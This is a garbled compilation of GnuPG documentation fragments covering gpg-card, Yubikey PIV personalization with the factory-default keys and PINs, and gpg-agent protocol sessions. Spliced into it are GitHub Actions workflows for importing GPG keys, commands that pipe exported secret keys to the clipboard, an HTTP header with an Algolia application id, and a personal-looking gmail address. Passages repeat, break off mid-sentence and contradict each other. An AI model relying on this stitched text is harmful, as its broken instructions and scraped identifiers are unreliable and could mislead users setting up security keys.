GENERATE [--force] [--algo=algo{+algo2}] keyref Create a new key on a card. Use --force to overwrite an existing key. Use "help" for algo to get a list of known algorithms. For OpenPGP cards several algos may be given. Note that the OpenPGP key generation is done interactively unless --algo or keyref

LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] ¶ L

READCERT [--openpgp] certref > file ¶

openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3"

WRITECERT certref < file ¶ WRITECERT --openpgp certref [< file|fpr] WRITECERT --clear certref Write a certificate to the card under the id certref.

WRITEKEY [--force] keyref keygrip ¶ Write a private key object identified by keygrip to the card under the id keyref. Option --force allows overwriting an existing key —Shadowed

YUBIKEY cmd args ¶ Various commands pertaining to Yubikey tokens with cmd being:

LIST List supported and enabled Yubikey applications.

ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] DISABLE Enable or disable the specified or all applications on the given interface.

Authentication key This is a 24 byte key described by the hex string 010203040506070801020304050607080102030405060708.

PIV

Authentication key This is a 24 byte key described by the hex string 010203040506070801020304050607080102030405060708

the string gpg/card> is the prompt

gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: D2760001240102010006090746250000 Application type .: OpenPGP Version ..........: 2.1 [...]

use help yubikey).

use help yubikey)

gpg/card> yubikey disable all opgp gpg/card> yubikey list Application USB NFC

OTP yes yes U2F yes yes OPGP no no PIV yes no OATH yes yes FIDO2 yes yes gpg/card> reset

/.gnupg/scdaemon.conf

application-priority piv

scdaemon

gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: [none] keyref .....: PIV.9A Card authenticat. : [none] keyref .....: PIV.9E Digital signature : [none] keyref .....: PIV.9C Key management ...: [none] keyref .....: PIV.9D In

Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D)

Card authentication key; however, that key is mandatory by the PIV standard and thus we create it too. Key generation requires that we authenticate to the card. This can be done either on the command line (which would reveal the key):

gpg/card> auth 010203040506070801020304050607080102030405060708

gpg/card> auth < myauth.key

gpg/card> generate --algo=nistp384 PIV.9A PIV card no. yk-9074625 detected gpg/card> generate --algo=nistp256 PIV.9E PIV card no. yk-9074625 detected gpg/card> generate --algo=rsa2048 PIV.9C PIV card no. yk-9074625 detected

gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 Key management ...: [none] keyref .....: PIV.9D —force

$ gpgsm --gen-key -o encr.crt (1) RSA (2) Existing key (3) Existing key from card Your selection? 1 What keysize do you want? (3072) 2048 Requested keysize is 2048 bits Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 3 Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

otto@example.net
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) y These parameters are used: Key-Type: RSA Key-Length: 2048 Key-Usage: encrypt Serial: random Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB gpgsm: certificate created Ready. $ gpgsm --import encr.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB gpg/card> writecert PIV.9D < encr.crt

[...] Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB keyref .....: PIV.9D (encr) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Encryption key for yk-9074625,O=example,C=DE user id ..: otto@example.net

34798AAFE0A7565088101CC4AE31C5C8C74461CB.key from the directory ~/.gnupg/private-keys-v1.d/

$ gpgsm --learn $ gpgsm --gen-key -o sign.crt Please select what kind of key you want: (1) RSA (2) Existing key (3) Existing key from card Your selection? 3 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 Your selection? 3 Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 2 Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

otto@example.net
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) These parameters are used: Key-Type: card:PIV.9C Key-Length: 1024 Key-Usage: sign Serial: random Name-DN: CN=Signing key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) y Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED gpgsm: certificate created Ready. $ gpgsm --import sign.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1

gpg/card> writecert PIV.9C < sign.crt

Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - [verified] - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Signing key for yk-9074625,O=example,C=DE user id ..: otto@example.net Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB keyref .....: PIV.9D (encr) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Encryption key for yk-9074625,O=example,C=DE user id ..: otto@example.net

PIV authentication’ key with ssh:

$ ssh-add -l 384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA)

$ gpgsm --learn $ gpg --full-gen-key Please select what kind of key you want: (1) RSA and RSA (default) (2) DSA and Elgamal (3) DSA (sign only) (4) RSA (sign only) (14) Existing key from card Your selection? 14 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign) (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) Your selection? 3 Please specify how long the key should be valid. 0 = key does not expire = key expires in n days w = key expires in n weeks m = key expires in n months y = key expires in n years Key is valid for? (0) Key does not expire at all Is this correct? (y/N) y

GnuPG needs to construct a user ID to identify your key.

Real name: Email address: otto@example.net Comment: You selected this USER-ID: "otto@example.net"

Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o gpg: key C3AFA9ED971BB365 marked as ultimately trusted gpg: revocation certificate stored as '[...]D971BB365.rev' public and secret key created and signed.

Note that this key cannot be used for encryption. You may want to use the command "--edit-key" to generate a subkey for this purpose. pub rsa2048 2019-04-04 [SC] 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 uid otto@example.net $ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 Secret key is available.

sec rsa2048/C3AFA9ED971BB365 created: 2019-04-04 expires: never usage: SC card-no: FF020001008A77C1 trust: ultimate validity: ultimate [ultimate] (1). otto@example.net gpg> addkey Secret parts of primary key are stored on-card. Please select what kind of key you want: (3) DSA (sign only) (4) RSA (sign only) (5) Elgamal (encrypt only) (6) RSA (encrypt only) (14) Existing key from card Your selection? 14 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign) (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) Your selection? 4 Please specify how long the key should be valid. 0 = key does not expire = key expires in n days w = key expires in n weeks m = key expires in n months y = key expires in n years Key is valid for? (0) Key does not expire at all Is this correct? (y/N) y Really create? (y/N) y

sec rsa2048/C3AFA9ED971BB365 created: 2019-04-04 expires: never usage: SC card-no: FF020001008A77C1 trust: ultimate validity: ultimate ssb rsa2048/7067860A98FCE6E1 created: 2019-04-04 expires: never usage: E card-no: FF020001008A77C1 [ultimate] (1). otto@example.net

gpg> save Now you can use your PIV card also with gpg.

 # 000006
/* 32A19-D90712
LEVEL-5 CLEARANCE ONLY ‘--force’ authentication key -header-'010203040506070801020304050607080102030405060708' SETDATA hexstring to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command

PKSIGN keyid where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like:

PKSIGN --hash=algoname keyid READKEY hexified_certid READCERT hexified_certid|keyid SERIALNO Return the serial number of the card using a status response like:

S SERIALNO D27600000000000000000000 WRITEKEY [--force] keyid SETDATA hexstring to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command

PKDECRYPT keyid CHECKPIN idstr RESTART APDU [--atr] [--more] [--exlen[=n]] [hexstring] S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1

./configure --sysconfdir=/etc --localstatedir=/va CN=Wurzel ZS 3,O=Intevation GmbH,C=DE A6935DD34EF3087973C706FC311AA2CCF733765B S

CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE

DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S

CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE

!14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S

   # Key added on: 2011-07-20 20:38:46
   # Fingerprint:  5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81
   34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm
private-keys-v1.d/ gpg-connect-agent 'help COMMAND' /bye SETKEY Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available.

PKDECRYPT The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text.

S: INQUIRE CIPHERTEXT
C: D (xxxxxx
C: D xxxx)
C: END
Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure:

 (enc-val
   (<algo>
     (<param_name1> <mpi>)
   ...
     (<param_namen> <mpi>)))
Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency.

If the decryption was successful the decrypted data is returned by means of "D" lines.

Here is an example session:

C: PKDECRYPT S: INQUIRE CIPHERTEXT C: D (enc-val elg (a 349324324) C: D (b 3F444677CA))) C: END S: # session key follows S: S PADDING 0 S: D (value 1234567890ABCDEF0) S: OK decryption successful The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has SIGKEY This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay.

SETHASH --hash=| sig-val ( (<param_name1> ) ... (<param_namen> ))) The operation is affected by the option

OPTION use-cache-for-signing=0|1 The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching.

Here is an example session:

C: SIGKEY S: OK key available C: SIGKEY S: OK key available C: PKSIGN S: # I did ask the user whether he really wants to sign S: # I did ask the user for the passphrase S: INQUIRE HASHVAL C: D ABCDEF012345678901234 C: END S: # signature follows S: D (sig-val rsa (s 45435453654612121212)) S: OK GENKEY [--no-protection] [--preset] [<cache_nonce>] Invokes the key generation process and the server will then inquire on the generation parameters, like:

S: INQUIRE KEYPARM C: D (genkey (rsa (nbits 1024))) C: END The format of the key parameters which depends on the algorithm is of the form:

(genkey
  (algo
    (parameter_name_1 ....)
      ....
    (parameter_name_n ....)))
If everything succeeds, the server returns the public key in a SPKI like S-Expression like this:

 (public-key
   (rsa
 (n <mpi>)
 (e <mpi>)))
Here is an example session:

C: GENKEY S: INQUIRE KEYPARM C: D (genkey (rsa (nbits 1024))) C: END S: D (public-key S: D (rsa (n 326487324683264) (e 10001))) S OK key created ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81> LISTTRUSTED GpgAgent returns a list of trusted keys line by line:

S: D 000000001234454556565656677878AF2F1ECCFF P
S: D 340387563485634856435645634856438576457A P
S: D FEDC6532453745367FD83474357495743757435D S
S: OK
The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future. Ok Finally a client should be able to mark a key as trusted:

MARKTRUSTED fingerprint "P"|"S" The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this:

S: INQUIRE TRUSTDESC C: D Do you trust the key with the fingerprint @FPR@ C: D bla fasel blurb. C: END S: OK GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]]
[--qualitybar] cache_id
[error_message prompt description] PRESET_PASSPHRASE [--inquire] <string_or_keygrip> []

HAVEKEY keygrips GET_CONFIRMATION description LEARN [--send] UPDATESTARTUPTTY SETDATA hexstring

PKSIGN keyid

PKSIGN --hash=algoname keyid

READCERT hexified_certid|keyid READKEY hexified_certid SETDATA hexstring d

PKSIGN keyid LEARN

PKSIGN --hash=algoname keyid

WRITEKEY [--force] keyid WRITEKEY [--force] keyid PASSWD [--reset] [--nullpin] chvno CHECKPIN idstr APDU [--atr] [--more] [--exlen[=n]] [hexstring] this:

 S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
--auto-key-import

command --locate-external-key command --locate-external-key github/workflows/release.yml: ldap://keys.(thedomain) ‘--auto-key-locate --auto-key-locate --auto-key-retrieve

honor-keyserver-url

-sig-keyserver-url --recv-key honor-keyserver-url --use-agent --gpg-agent-info

--no-random-seed-file Host: c7-use-3.algolianet. com Accept: / Sec-Fetch-Site: cross-site Accept-Language: en-US, en; q=0.9 Accept-Encoding: gzip, deflate, br Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B Origin: https://dashboard.algolia.com User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe x-algolia-api-key: b3cf*************************米** Content-Length: 27 Connection: keep-alive Content-Type: application/x-www-form-urlencoded Sec-Fetch-Dest: empty

scdaemon.conf 1 HKCU\Software\GNU\GnuPG:DefaultLogFile, --debug-level level HKCU\Software\GNU\GnuPG:DefaultLogFile, scd-event HKCU\Software\GNU\GnuPG:HomeDir HKCU\Software\GNU\GnuPG:DefaultLogFile, reader_n.status HKCU\Software\GNU\GnuPG:HomeDir

trustlist.txt file gpg-agent.conf HKCU\Software\GNU\GnuPG:HomeDir name: release debug-pinentry --debug 1024

global trustlist (/usr/local/etc/gnupg/trustlist.tx

Active cards Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers. gpg-connect-agent updatestartuptty /bye Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command:

gpg-connect-agent /bye --scdaemon-program filename Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf --check-passphrase-pattern file --check-sym-passphrase-pattern file Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg) bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe Keys listed in the sshcontrol file --disable-extended-key-format These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched.

--enable-ssh-support --enable-win32-openssh-support --enable-putty-support

gpg-connect-agent 'GETINFO s2k_count' /bye gpg-connect-agent 'GETINFO s2k_time' /bye To view the auto-calibrated count use:

gpg-connect-agent 'GETINFO s2k_count_cal' /bye --ssh-fingerprint-digest Keys listed in the sshcontrol file

Active card gpg-connect-agent /bye bashrc or whatever initialization file is used for all shell invocations:

GPG_TTY=$(tty) export GPG_TTY --daemon [command line] server

agent-program file ¶ Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs.

--gpg-program file Specify a non-default gpg binary to be used by certain commands.

--gpgsm-program file Specify a non-default gpgsm binary to be used by certain commands.

--chuid uid Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows.

gpg-card AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶ AUTH FETCH GENERATE [--force] [--algo=algo{+algo2}] keyref KDF-SETUP ¶ Prepare the OpenPGP card KDF feature for this card.

LANG [--clear] Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info.

LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] NAME [--clear] PRIVATEDO [--clear] n [< file] file READCERT [--openpgp] certref > file ¶ Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3". URL [--clear] gpg's. --fetch WRITECERT certref < file ¶ WRITECERT --openpgp certref [< file|fpr] WRITECERT --clear certref --openpgp file fpr. WRITEKEY [--force] keyref keygrip ¶ Write a private key object identified by keygrip to the card under the id keyref. CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶ Serial number A hex-string with the serial number of the card.

Type This gives the type of the card’s application. For example "OpenPGP" or "PIV".

Keygrip A hex-string identifying a key.

Keyref The application slot where the key is stored on the card. For example "OpenPGP.1"

Status The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card.

YUBIKEY cmd args Various commands pertaining to Yubikey tokens with cmd being:

LIST List supported and enabled Yubikey applications.

ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] DISABLE Enable or disable the specified or all applications on the given interface.

The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit.

GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are:

Authentication key This is a 24 byte key described by the hex string 010203040506070801020304050607080102030405060708.

PIV Application PIN This is the string 123456.

PIN Unblocking Key This is the string 12345678. list (the string gpg/card> card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: D2760001240102010006090746250000 Application type .: OpenPGP Version ..........: 2.1 [...] on: push: tags: - "v*"

permissions: contents: write

jobs: release: runs-on: ubuntu-latest steps: - uses: actions/checkout@v3 - uses: cli/gh-extension-precompile@v1 with: go_version: "1.16" Then

uses: cli/gh-extension-precompile@v1 env: CGO_ENABLED: 1
uses: cli/gh-extension-precompile@v1 with: build_script_override: "script/build.sh" name: release
on: push: tags: - "v*"

permissions: contents: write

jobs: release: runs-on: ubuntu-latest steps: - uses: actions/checkout@v3 - id: import_gpg uses: crazy-max/ghaction-import-gpg@v5 with: gpg_private_key: {{ secrets.GPG_PASSPHRASE }} - uses: cli/gh-extension-precompile@v1 with: gpg_fingerprint: ${{ steps.import_gpg.outputs.fingerprint }}

macOS

gpg --armor --export-secret-key joe@foo.bar | pbcopy

Ubuntu (assuming GNU base64)

gpg --armor --export-secret-key joe@foo.bar -w0 | xclip

Arch

gpg --armor --export-secret-key joe@foo.bar | xclip -selection clipboard -i

FreeBSD (assuming BSD base64)

gpg --armor --export-secret-key joe@foo.bar | xclip

name: import-gpg

on: push: branches: master

jobs: import-gpg: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v4 - name: Import GPG key uses: crazy-max/ghaction-import-gpg@v6 with: gpg_private_key: {{ secrets.PASSPHRASE }} - name: List keys run: gpg -K name: import-gpg

on: push: branches: master

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB gpg/card> writecert PIV.9D < encr.crt

jobs: import-gpg: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v4 - name: Import GPG key uses: crazy-max/ghaction-import-gpg@v6 with: gpg_private_key: {{ secrets.PASSPHRASE }} fingerprint: "C17D11ADF199F12A30A0910F1F80449BE0B08CB8" - name: List keys run: gpg -K

pub ed25519 2021-09-24 [C] 87F257B89CE462100BEC0FFE6071D218380FDCC8 Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092 uid [ unknown] Joe Bar joe@bar.foo sub ed25519 2021-09-24 [S] C17D11ADF199F12A30A0910F1F80449BE0B08CB8 Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB name: import-gpg /.gnupg/scdaemon.conf and by restarting scdaemon, either by killing the process or by using gpgconf --kill scdaemon. Finally the default order in which card applications are tried by scdaemon can be changed. For example to prefer PIV over OpenPGP it is sufficient to add

application-priority piv to ~/.gnupg/scdaemon.conf and to restart scdaemon. This has an effect only on tokens which support both, PIV and OpenPGP, but does not hamper the use of OpenPGP only tokens.

With one of these methods employed the list command of gpg-card shows this:

gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: [none] keyref .....: PIV.9A Card authenticat. : [none] keyref .....: PIV.9E Digital signature : [none] keyref .....: PIV.9C Key management ...: [none] keyref .....: PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB.key list --cards well. The PIV authentication key (internal reference PIV.9A Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) is used for encryption

gpg/card> auth 010203040506070801020304050607080102030405060708 gpg/card> auth < myauth.key

gpg/card> generate --algo=nistp384 PIV.9A PIV card no. yk-9074625 detected gpg/card> generate --algo=nistp256 PIV.9E PIV card no. yk-9074625 detected gpg/card> generate --algo=rsa2048 PIV.9C PIV card no. yk-9074625 detected ‘--force’ gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 Key management ...: [none] keyref .....: PIV.9D keygrip gpg self-signed X.509 certificate (exit the gpg-card tool, first):

$ gpgsm --gen-key -o encr.crt (1) RSA (2) Existing key (3) Existing key from card Your selection? 1 What keysize do you want? (3072) 2048 Requested keysize is 2048 bits Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 3 Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

otto@example.net
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) y These parameters are used: Key-Type: RSA Key-Length: 2048 Key-Usage: encrypt Serial: random Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB gpgsm: certificate created Ready. $ gpgsm --import encr.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1 gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 Key management ...: [none] keyref .....: PIV.9D keygrip gpgsm --gen-key -o encr.crt (1) RSA (2) Existing key (3) Existing key from card Your selection? 1 What keysize do you want? (3072) 2048 Requested keysize is 2048 bits Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 3 Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

otto@example.net
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) y These parameters are used: Key-Type: RSA Key-Length: 2048 Key-Usage: encrypt Serial: random Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB gpgsm: certificate created Ready. $ gpgsm --import encr.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB gpg/card> writecert PIV.9D < encr.crt

gpgsm --with-keygrip -k 6309304695z@gmail.com Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB keyref .....: PIV.9D (encr) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Encryption key for yk-9074625,O=example,C=DE user id ..: 6309304695z@gmail.com

34798AAFE0A7565088101CC4AE31C5C8C74461CB.key

$ gpgsm --learn $ gpgsm --gen-key -o sign.crt Please select what kind of key you want: (1) RSA (2) Existing key (3) Existing key from card Your selection? 3 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 Your selection? 3 Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 2 Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

6309304695z@gmail.com
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) These parameters are used: Key-Type: card:PIV.9C Key-Length: 1024 Key-Usage: sign Serial: random Name-DN: CN=Signing key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

